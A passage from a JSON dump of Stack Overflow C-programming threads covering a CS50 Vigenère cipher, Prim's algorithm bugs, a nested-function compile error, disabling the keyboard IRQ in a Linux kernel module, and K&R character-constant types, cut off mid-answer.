thanks!</p>\n\n<pre><code>#include &lt;cs50.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;stdlib.h&gt;\n\n//getting user encryption key\n\n\nint main(int argc, string argv[])\n{\n\n    if (argc != 2)\n    {\n        printf(\"Usage: ./vigenere keyword\\n\");\n        return 1;\n    }\n    //check if all are alphabeticals\n    else \n    {\n           for (int i = 1; i &lt; argc; i++)\n        {\n            for (int j = 0; j &lt; strlen(argv[i]); j++)\n            {\n                if (isalpha(argv[i][j]) == false)\n                {                \n                    printf(\"Usage: ./vigenere keyword\\n\");\n                    return 1;\n                }\n            }\n        }\n    }  \n\n\n    //getting plaintext divide it into each character\n    string pt = get_string(\"plaintext: \");\n\n    printf(\"ciphertext: \");\n    //convert to ciphertext\n    //C = (P + k) % 26\n    for (int r = 0; r &lt; strlen(pt); r++)\n    {                           \n        if (isupper(pt[r]))\n        {\n            //making loop with j group corresponding to keyword\n            int j = r % strlen(argv[1]);\n            int key = tolower(argv[1][j]) - 97;\n            printf(\"%c\", (pt[r] - 65 + key) % 26 + 65);\n        }\n        else if (islower(pt[r]))\n        {\n            //making loop with j group corresponding to keyword\n            int j = r % strlen(argv[1]);\n            int key = tolower(argv[1][j]) - 97;\n            printf(\"%c\", (pt[r] - 97 + key) % 26 + 97);\n        }\n        else\n        {\n            printf(\"%c\", pt[r]);\n        }\n\n     }            \n       printf(\"\\n\");       \n\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "prims-algorithm"], "answers": [{"tags": [], "owner": {"reputation": 3108, "user_id": 1556820, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/cffaba688aa3f0f21ece8e09c9450e37?s=128&d=identicon&r=PG", "display_name": "mangusta", "link": "https://stackoverflow.com/users/1556820/mangusta"}, "is_accepted": true, "score": 1, "last_activity_date": 1545794753, "last_edit_date": 1545794753, "creation_date": 1545793762, "answer_id": 53927057, "question_id": 53926768, "link": "https://stackoverflow.com/questions/53926768/clear-array-data-in-c-prim-s-algorithm/53927057#53927057", "title": "Clear array data in C (Prim\u2019s Algorithm)", "body": "<p>You don't reset <code>row_a</code> variable after completing MST for each case.  </p>\n\n<pre><code>for(i=0; i&lt;limit1; i++)\n{\n    scanf(\"%d\",&amp;limit2);\n    for(j=0; j&lt;limit2; j++)\n    {\n        scanf(\"%s\",datawithco);\n        pch = strtok (datawithco,\",\");\n        while (pch != NULL)\n        {\n            //printf (\"%s\\n\",pch);\n            graph[row_a][column_a] = atoi(pch);\n            column_a++;\n            pch = strtok (NULL, \",\");\n        }\n        column_a=0;\n        row_a++;\n    }\n\n    primMST(graph);\n    graph[row_a][column_a] = '\\0';  \n    row_a=0; //&lt;---added\n}\n</code></pre>\n\n<p>Besides you never reset your <code>graph</code> after each case. For these particular cases that you've provided, it is fine, because the number of vertices in the 2nd case is larger than the number of vertices in the 1st case, so the cells for the 2nd case will overwrite the cells for the 1st case, otherwise the cells left from the previous case will be regarded as valid ones which is obviously wrong. So you should either add the graph reset into <code>primMST()</code> function or add it at the start of every case</p>\n"}], "owner": {"reputation": 41, "user_id": 8955356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e8437362b0277eb3d2be248d8a185fb2?s=128&d=identicon&r=PG&f=1", "display_name": "YellowBoy", "link": "https://stackoverflow.com/users/8955356/yellowboy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 141, "favorite_count": 0, "accepted_answer_id": 53927057, "answer_count": 1, "score": 0, "last_activity_date": 1556351794, "creation_date": 1545789390, "last_edit_date": 1556351794, "question_id": 53926768, "link": "https://stackoverflow.com/questions/53926768/clear-array-data-in-c-prim-s-algorithm", "title": "Clear array data in C (Prim\u2019s Algorithm)", "body": "<p>I write a code about implement Prim's Algorithm and build the\nminimum spanning tree starting from vertex 1.</p>\n\n<p>Here's the input format:</p>\n\n<blockquote>\n  <p>The first line will be the number of cases.</p>\n  \n  <p>Each case begins with the number of vertices.</p>\n</blockquote>\n\n<p>Suppose i input like this:</p>\n\n<pre><code>2\n4\n0,1,0,4\n1,0,3,2\n0,3,0,5\n4,2,5,0\n6\n0,7,9,0,0,6\n7,0,0,2,0,0\n9,0,0,0,5,0\n0,2,0,0,0,3\n0,0,5,0,0,4\n6,0,0,3,4,0\n</code></pre>\n\n<p>This means i have 2 test case, and the '4' means have 4 lines of vertices.</p>\n\n<p>Example:   </p>\n\n<p>0,1,0,4 </p>\n\n<p>1,0,3,2 </p>\n\n<p>0,3,0,5 </p>\n\n<p>4,2,5,0</p>\n\n<p>Will be like this</p>\n\n<pre><code>  |0||1||2||3| \n0| 0  1  0  4\n1| 1  0  3  2 \n2| 0  3  0  5\n3| 4  2  5  0 \n</code></pre>\n\n<p>0 to 4 need 4 distances, 2-2 need 3 distances, etc</p>\n\n<p>The first output was correct, which is</p>\n\n<pre><code>0-1 1\n1-2 3\n1-3 2\n</code></pre>\n\n<p>But the second output also same with the first output, which means wrong</p>\n\n<pre><code>0-1 1\n1-2 3\n1-3 2\n</code></pre>\n\n<p>Here's my code</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;limits.h&gt;\n#include&lt;stdbool.h&gt;\n// Number of vertices in the graph\n#define V 100\n\n// A utility function to find the vertex with\n// minimum key value, from the set of vertices\n// not yet included in MST\nint minKey(int key[], bool mstSet[])\n{\n// Initialize min value\nint min = INT_MAX, min_index;\nint v;\nfor (v = 0; v &lt; V; v++)\n    if (mstSet[v] == false &amp;&amp; key[v] &lt; min)\n        min = key[v], min_index = v;\n\nreturn min_index;\n}\n\n// A utility function to print the\n// constructed MST stored in parent[]\nint printMST(int parent[], int n, int graph[V][V])\n{\nint i;\nchar front1;\nchar back2;\n\n//printf(\"Edge \\tWeight\\n\");\nfor (i = 1; i &lt; V; i++)\n    if(graph[i][parent[i]]!=0)\n    {\n        front1 = parent[i];\n        front1 += 16;\n        back2 = i;\n        back2 +=16;\n        printf(\"%d-%d %d \\n\", parent[i], i, graph[i][parent[i]]);\n    }\n\n    else\n        break;\n}\n\n// Function to construct and print MST for\n// a graph represented using adjacency\n// matrix representation\nvoid primMST(int graph[V][V])\n{\nint i,count,v;\n// Array to store constructed MST\nint parent[V];\n// Key values used to pick minimum weight edge in cut\nint key[V];\n// To represent set of vertices not yet included in MST\nbool mstSet[V];\n\n// Initialize all keys as INFINITE\nfor (i = 0; i &lt; V; i++)\n    key[i] = INT_MAX, mstSet[i] = false;\n\n// Always include first 1st vertex in MST.\n// Make key 0 so that this vertex is picked as first vertex.\nkey[0] = 0;\nparent[0] = -1; // First node is always root of MST\n\n// The MST will have V vertices\nfor (count = 0; count &lt; V-1; count++)\n{\n    // Pick the minimum key vertex from the\n    // set of vertices not yet included in MST\n    int u = minKey(key, mstSet);\n\n    // Add the picked vertex to the MST Set\n    mstSet[u] = true;\n\n    // Update key value and parent index of\n    // the adjacent vertices of the picked vertex.\n    // Consider only those vertices which are not\n    // yet included in MST\n    for (v = 0; v &lt; V; v++)\n\n        // graph[u][v] is non zero only for adjacent vertices of m\n        // mstSet[v] is false for vertices not yet included in MST\n        // Update the key only if graph[u][v] is smaller than key[v]\n        if (graph[u][v] &amp;&amp; mstSet[v] == false &amp;&amp; graph[u][v] &lt; key[v])\n            parent[v] = u, key[v] = graph[u][v];\n}\n\n// print the constructed MST\nprintMST(parent, V, graph);\n}\n\nint main()\n{\n\nprintf(\"%c\",one1);\nint i,j,limit1,limit2;\nint column_a=0;\nint row_a=0;\nchar datawithco[1000];\nchar *pch;\nint graph[V][V];\n\nscanf(\"%d\",&amp;limit1);\n\nfor(i=0; i&lt;limit1; i++)\n{\n    scanf(\"%d\",&amp;limit2);\n    for(j=0; j&lt;limit2; j++)\n    {\n        scanf(\"%s\",datawithco);\n        pch = strtok (datawithco,\",\");\n        while (pch != NULL)\n        {\n            //printf (\"%s\\n\",pch);\n            graph[row_a][column_a] = atoi(pch);\n            column_a++;\n            pch = strtok (NULL, \",\");\n        }\n        column_a=0;\n        row_a++;\n    }\n\n    primMST(graph);\n    graph[row_a][column_a] = '\\0';\n}\n\nreturn 0;\n}\n</code></pre>\n\n<p>The second output should be</p>\n\n<pre><code>0-5 6\n5-3 3\n3-1 2\n5-4 4\n4-2 5\n</code></pre>\n"}, {"tags": ["c", "cs50"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 6, "creation_date": 1545788221, "post_id": 53926694, "comment_id": 94694904, "body": "I&#39;d be more worried how to fix the syntax so it <i>compiles</i> before I worry about the bugs. The error message is self-explanatory. You can&#39;t define nested functions in C. <code>valid_triangle</code> should be defined <i>outside</i> of <code>main</code>."}, {"owner": {"reputation": 395, "user_id": 9130364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16db2beef23da46ff99782ccb41ca988?s=128&d=identicon&r=PG&f=1", "display_name": "user71812", "link": "https://stackoverflow.com/users/9130364/user71812"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1545788489, "post_id": 53926694, "comment_id": 94694934, "body": "I put <code>bool valid_triangle (float a, float b, float c);</code> above the <code>int(main)</code> as you said. It still doesn&#39;t work :("}, {"owner": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 4, "creation_date": 1545788674, "post_id": 53926694, "comment_id": 94694964, "body": "You have to move the whole thing out of <code>main</code> not just the forward declaration. You cannot define a function from inside another function."}, {"owner": {"reputation": 225, "user_id": 8363795, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NkUCkHmpY58/AAAAAAAAAAI/AAAAAAAAAY4/Ylb34NmG0p4/photo.jpg?sz=128", "display_name": "&#193;d&#225;m R&#233;v&#233;sz", "link": "https://stackoverflow.com/users/8363795/%c3%81d%c3%a1m-r%c3%a9v%c3%a9sz"}, "edited": false, "score": 1, "creation_date": 1545788832, "post_id": 53926694, "comment_id": 94694989, "body": "That means you\u2019ve moved the <i>declaration</i> of valid_triangle outside of main. Move the definition also (line 6-21)."}, {"owner": {"reputation": 395, "user_id": 9130364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16db2beef23da46ff99782ccb41ca988?s=128&d=identicon&r=PG&f=1", "display_name": "user71812", "link": "https://stackoverflow.com/users/9130364/user71812"}, "edited": false, "score": 0, "creation_date": 1545789076, "post_id": 53926694, "comment_id": 94695017, "body": "Oh now it works!! Thanks so much guys! But can someone explain to me as to why the int main(void) is needed here? I thought that it is needed at the very top of the code to &quot;trigger&quot; the codes below to work... but apparently that&#39;s not the case."}, {"owner": {"reputation": 117699, "user_id": 62576, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/15264f7bf48e10ce32dfa4865a13763c?s=128&d=identicon&r=PG", "display_name": "Ken White", "link": "https://stackoverflow.com/users/62576/ken-white"}, "edited": false, "score": 0, "creation_date": 1545789154, "post_id": 53926694, "comment_id": 94695032, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/51488853/function-definition-not-allowed-here\">Function definition not allowed here</a> Please do at least a basic search for the error message here before posting; chances are very good that it&#39;s been asked about here before."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1545789431, "post_id": 53926694, "comment_id": 94695065, "body": "The <code>main()</code> function is where the execution starts.  So, in C, always need exactly one instance of a <code>main()</code> function."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1545789631, "post_id": 53926694, "comment_id": 94695092, "body": "regarding: <code>#include &lt;math.h&gt;</code>  it is a poor programming practice to include header files those contents are nor used"}, {"owner": {"reputation": 395, "user_id": 9130364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16db2beef23da46ff99782ccb41ca988?s=128&d=identicon&r=PG&f=1", "display_name": "user71812", "link": "https://stackoverflow.com/users/9130364/user71812"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545789716, "post_id": 53926694, "comment_id": 94695101, "body": "Ah okay, now I get it, thanks @user3629249 and everyone! Thanks for the advice too! :)"}], "answers": [{"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 1, "last_activity_date": 1545790351, "creation_date": 1545790351, "answer_id": 53926827, "question_id": 53926694, "link": "https://stackoverflow.com/questions/53926694/how-to-debug-this-error-in-c-function-definition-is-not-allowed-here/53926827#53926827", "title": "How to debug this error in C: function definition is not allowed here?", "body": "<p>the following proposed code:</p>\n\n<ol>\n<li>performs the indicated functionality</li>\n<li>cleanly compiles</li>\n<li>displays one way to have sub functions in C</li>\n</ol>\n\n<p>and now, the proposed code:</p>\n\n<pre><code>//#include &lt;cs50.h&gt;\n#include &lt;stdio.h&gt;   // putc()\n//#include &lt;math.h&gt;\n#include &lt;stdbool.h&gt; // bool, true, false\n\n\nbool valid_triangle (float a, float b, float c)\n{\n    // check positive values\n    if ( a &lt;= 0 || b &lt;= 0 || c &lt;= 0 )\n    {\n        return false;\n    }\n\n    //check two sides are longer\n    if ( (a + b &lt;= c) || (a+c &lt;= b) || (b+c &lt;= a))\n    {\n        return false;\n    }\n\n    //otherwise return true\n    return true;\n}\n\n\nint main (void)\n{\n    float a = 1;\n    float b = 2;\n    float c = 3;\n\n    if( valid_triangle (a, b, c) )\n    {\n       puts( \"able to calculate triangle area\" );\n    }\n\n    else\n    {\n       puts( \"area of triangle cannot be calculated\" );\n    }\n\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 8998487, "user_type": "registered", "profile_image": "https://graph.facebook.com/10156283719190715/picture?type=large", "display_name": "Jinji", "link": "https://stackoverflow.com/users/8998487/jinji"}, "is_accepted": false, "score": 1, "last_activity_date": 1545793387, "creation_date": 1545793387, "answer_id": 53927023, "question_id": 53926694, "link": "https://stackoverflow.com/questions/53926694/how-to-debug-this-error-in-c-function-definition-is-not-allowed-here/53927023#53927023", "title": "How to debug this error in C: function definition is not allowed here?", "body": "<p>Compiler error messages are your best friend, so use them to your advantage. Here, your error message <code>triangle.c:9.6</code> tells you that your error is on line 9. Also, it spits out the string <code>error: function definition is not allowed here.</code></p>\n\n<p>In C, a procedural language, function definitions are not allowed inside of other functions.</p>\n\n<p>To fix this, either define your function before your <code>main()</code> function, and then just call your <code>valid_triangle</code> function from your main function. Another way to organize your code would to put the <code>valid_triangle</code> function prototype before the <code>main</code> function, and then define the <code>valid_triangle</code> below the body of the <code>main</code> function.</p>\n\n<p>Remember, the main() function is the point of entry for your program.</p>\n"}], "owner": {"reputation": 395, "user_id": 9130364, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16db2beef23da46ff99782ccb41ca988?s=128&d=identicon&r=PG&f=1", "display_name": "user71812", "link": "https://stackoverflow.com/users/9130364/user71812"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1048, "favorite_count": 1, "answer_count": 2, "score": -1, "last_activity_date": 1546987891, "creation_date": 1545787901, "last_edit_date": 1546987891, "question_id": 53926694, "link": "https://stackoverflow.com/questions/53926694/how-to-debug-this-error-in-c-function-definition-is-not-allowed-here", "title": "How to debug this error in C: function definition is not allowed here?", "body": "<p>I am new to programming and am taking edX's CS50 (Intro to Programming) class. There is this C code that I have been trying to compile, but always results in an error message that looks like this:\n<a href=\"https://i.stack.imgur.com/Kxeqw.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/Kxeqw.png\" alt=\"error message\"></a></p>\n\n<p>This is the code lines that I have been trying to compile:</p>\n\n<pre><code>#include &lt;cs50.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\nint main (void)\n{\n   bool valid_triangle (float a, float b, float c);\n   bool valid_triangle (float a, float b, float c)\n  {\n   // check positive values\n     if ( a &lt;= 0 || b &lt;= 0 || c &lt;= 0 )\n    {\n    return false;\n     }\n    //check two sides are longer\n    if ( (a + b &lt;= c) || (a+c &lt;= b) || (b+c &lt;= a))\n    {\n    return false;\n    }\n\n    //otherwise return true\n     return true;\n }\n\n}\n</code></pre>\n\n<p>Does anyone know what I did wrong and how to fix this error? Thanks a lot!</p>\n"}, {"tags": ["c", "linux", "linux-kernel", "linux-device-driver", "interrupt"], "comments": [{"owner": {"reputation": 25733, "user_id": 559737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5de249db6565b87a2699e131974268a?s=128&d=identicon&r=PG", "display_name": "Brendan", "link": "https://stackoverflow.com/users/559737/brendan"}, "edited": false, "score": 0, "creation_date": 1545879104, "post_id": 53926622, "comment_id": 94718135, "body": "A better question might be: after you&#39;ve deliberately ruined everything, how can <code>msleep()</code> work without a timer IRQ to let kernel know you should stop sleeping?"}, {"owner": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "reply_to_user": {"reputation": 25733, "user_id": 559737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5de249db6565b87a2699e131974268a?s=128&d=identicon&r=PG", "display_name": "Brendan", "link": "https://stackoverflow.com/users/559737/brendan"}, "edited": false, "score": 0, "creation_date": 1545879193, "post_id": 53926622, "comment_id": 94718155, "body": "I have only disabled keyboard IRQ not timer irq"}, {"owner": {"reputation": 25733, "user_id": 559737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5de249db6565b87a2699e131974268a?s=128&d=identicon&r=PG", "display_name": "Brendan", "link": "https://stackoverflow.com/users/559737/brendan"}, "edited": false, "score": 3, "creation_date": 1545879791, "post_id": 53926622, "comment_id": 94718236, "body": "Have you? Keyboard is likely to be a USB device where USB controller uses MSI or IO APIC (and not IRQ 1). If it is an ancient computer (with a real PS/2 keyboard) then you probably press &quot;enter&quot; to start your module and the GUI (or maybe keyboard driver) probably starts emulating &quot;key repeat&quot; when it sees &quot;enter key pressed&quot; until it sees the &quot;enter key released&quot; that you disabled."}, {"owner": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "reply_to_user": {"reputation": 25733, "user_id": 559737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5de249db6565b87a2699e131974268a?s=128&d=identicon&r=PG", "display_name": "Brendan", "link": "https://stackoverflow.com/users/559737/brendan"}, "edited": false, "score": 0, "creation_date": 1545883163, "post_id": 53926622, "comment_id": 94718706, "body": "irq number 1 is for i8042 which is the keyboard integrated in my laptop"}, {"owner": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "reply_to_user": {"reputation": 25733, "user_id": 559737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5de249db6565b87a2699e131974268a?s=128&d=identicon&r=PG", "display_name": "Brendan", "link": "https://stackoverflow.com/users/559737/brendan"}, "edited": false, "score": 0, "creation_date": 1545883258, "post_id": 53926622, "comment_id": 94718726, "body": "I connected a USB Keyboard to my Laptop, pressing keys still increases the count in irq 1 . Observed the behavior in &quot;watch -n 0.1 cat /proc/interrupts&quot;"}, {"owner": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "reply_to_user": {"reputation": 25733, "user_id": 559737, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5de249db6565b87a2699e131974268a?s=128&d=identicon&r=PG", "display_name": "Brendan", "link": "https://stackoverflow.com/users/559737/brendan"}, "edited": false, "score": 1, "creation_date": 1545885113, "post_id": 53926622, "comment_id": 94719005, "body": "I tried loading the module from cron job instead of typing insmod and pressing enter. With cron job, there were no enter keys being pressed, so you were correct, as there was no key release after typing insmod, it continuously emulated enter key until the interrupts were enabled again"}], "owner": {"reputation": 3001, "user_id": 2830324, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8e718abdfd920bb3f66d81bbbb10e80f?s=128&d=identicon&r=PG&f=1", "display_name": "md.jamal", "link": "https://stackoverflow.com/users/2830324/md-jamal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 132, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1545858342, "creation_date": 1545786474, "last_edit_date": 1545858342, "question_id": 53926622, "link": "https://stackoverflow.com/questions/53926622/disabling-keyboard-irq-receives-so-many-enter-keys", "title": "Disabling keyboard irq receives so many enter keys", "body": "<p>I was trying to write a sample code to test <code>disable_irq</code> and <code>enable_irq</code>. As the IRQ Number for Keyboard is 1, I wrote the following code:</p>\n\n<pre><code>#include &lt;linux/kernel.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;linux/interrupt.h&gt;\n#include &lt;linux/delay.h&gt;\n\nMODULE_LICENSE(\"GPL\");\nstatic int test_interrupt_init(void)\n{\n    printk(KERN_INFO\"%s: In init\\n\", __func__);\n    disable_irq(1);\n    msleep(5*1000);\n    enable_irq(1);\n    return 0;\n}\n\nstatic void test_interrupt_exit(void)\n{\n    printk(KERN_INFO\"%s: In exit\\n\", __func__);\n}\n\nmodule_init(test_interrupt_init);\nmodule_exit(test_interrupt_exit);\n</code></pre>\n\n<p>The output behavior is wierd, it disables the keyboard, but a lot of enter keys are automatically being pressed. How is sending the Enter keys to the Linux Kernel</p>\n"}, {"tags": ["c", "type-conversion", "kernighan-and-ritchie"], "comments": [{"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1545810517, "post_id": 53926270, "comment_id": 94698964, "body": "No, the conversion they are talking about happens <i>inside</i> the functuon body."}], "answers": [{"comments": [{"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 1, "creation_date": 1545781568, "post_id": 53926327, "comment_id": 94694203, "body": "K&amp;R precedes the C standard. Is there reason to believe that, in their text, the type of <code>&#39;a&#39;</code> was <code>int</code> and not <code>char</code>?"}, {"owner": {"reputation": 514, "user_id": 1219728, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a6288e5b5f82f31c9f149378e3f6cb66?s=128&d=identicon&r=PG", "display_name": "efie", "link": "https://stackoverflow.com/users/1219728/efie"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 1, "creation_date": 1545782001, "post_id": 53926327, "comment_id": 94694251, "body": "@EricPostpischil On page 37 the book says: &quot;A <i>character constant</i> is an integer, written as one character within single quotes, such as <code>&#39;x&#39;</code>&quot;. I&#39;m not sure if &quot;is an integer&quot; means &quot;is of type <code>int</code>&quot;?"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 514, "user_id": 1219728, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a6288e5b5f82f31c9f149378e3f6cb66?s=128&d=identicon&r=PG", "display_name": "efie", "link": "https://stackoverflow.com/users/1219728/efie"}, "edited": false, "score": 2, "creation_date": 1545782047, "post_id": 53926327, "comment_id": 94694254, "body": "@efie: <code>char</code>, <code>short</code>, <code>int</code>, and <code>long</code> are all integer types, and an integer is just a value, so I do not think their reference to a character as an integer is informative."}, {"owner": {"reputation": 514, "user_id": 1219728, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a6288e5b5f82f31c9f149378e3f6cb66?s=128&d=identicon&r=PG", "display_name": "efie", "link": "https://stackoverflow.com/users/1219728/efie"}, "edited": false, "score": 0, "creation_date": 1545782571, "post_id": 53926327, "comment_id": 94694308, "body": "That makes sense, thanks. Regarding your first comment: On page two the book says: &quot;The second edition of <i>The C Programming Language</i> describes C as defined by the ANSI standard.&quot;"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 4, "last_activity_date": 1545857052, "last_edit_date": 1545857052, "creation_date": 1545781431, "answer_id": 53926327, "question_id": 53926270, "link": "https://stackoverflow.com/questions/53926270/how-exactly-is-this-function-an-example-of-a-char-to-int-conversion/53926327#53926327", "title": "How exactly is this function an example of a char to int conversion?", "body": "<p>Character constants have type <code>int</code>, as you expected, so you are correct that there are no promotions to <code>int</code> in this function.  </p>\n\n<p>Any promotion that may occur would happen if a variable of type <code>char</code> is passed to this function, and this is most likely what the text is referring to.</p>\n\n<p>The type of character constants is <code>int</code> in both the current <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf\" rel=\"nofollow noreferrer\">C17 standard</a> (section 6.4.4.4p10):</p>\n\n<blockquote>\n  <p>An integer character constant has type\n  <code>int</code></p>\n</blockquote>\n\n<p>And in the <a href=\"http://port70.net/~nsz/c/c89/c89-draft.html\" rel=\"nofollow noreferrer\">C89 / ANSI C standard</a> (section 3.1.3.4 under Semantics): </p>\n\n<blockquote>\n  <p>An integer character constant has type <code>int</code></p>\n</blockquote>\n\n<p>The latter of which is what K&amp;R Second Edition refers to.</p>\n"}, {"comments": [{"owner": {"reputation": 514, "user_id": 1219728, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a6288e5b5f82f31c9f149378e3f6cb66?s=128&d=identicon&r=PG", "display_name": "efie", "link": "https://stackoverflow.com/users/1219728/efie"}, "edited": false, "score": 0, "creation_date": 1545784981, "post_id": 53926363, "comment_id": 94694598, "body": "Thanks! Do you know if a character constant was of type <code>int</code> in ANSI C as well? Or was it of type <code>char</code> which would add another explanation?"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1545810342, "post_id": 53926363, "comment_id": 94698915, "body": "Nothing whatsoever has changed about this function since C89."}], "tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": false, "score": 4, "last_activity_date": 1545781854, "creation_date": 1545781854, "answer_id": 53926363, "question_id": 53926270, "link": "https://stackoverflow.com/questions/53926270/how-exactly-is-this-function-an-example-of-a-char-to-int-conversion/53926363#53926363", "title": "How exactly is this function an example of a char to int conversion?", "body": "<p>K&amp;R C is old.  Really old.  Many particulars of K&amp;R C are no longer true in up-to-date standard C.</p>\n\n<p>In stadard, up-to-date C11, there is no conversion to/from <code>char</code> in the function you posted:</p>\n\n<pre><code>/* lower: convert c to lower case; ASCII only */\nint lower(int c)\n{\n    if (c 